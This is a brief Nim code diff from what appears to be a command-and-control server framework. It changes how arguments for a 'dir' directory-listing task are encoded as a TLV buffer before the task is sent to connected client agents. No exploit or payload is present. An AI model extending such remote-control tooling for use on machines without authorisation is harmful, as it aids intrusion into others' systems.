@@ -13,7 +13,7 @@ proc nameCmp(a, b: fileObj): int =
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   for client in server.cli.handlingClient:
     
-    var task = await client.sendClientTask("dir", args)
+    var task = await client.sendClientTask("dir", tlvFromStringSeq(args).buf)
     
     if not task.isNil(): 
       await task.awaitResponse()
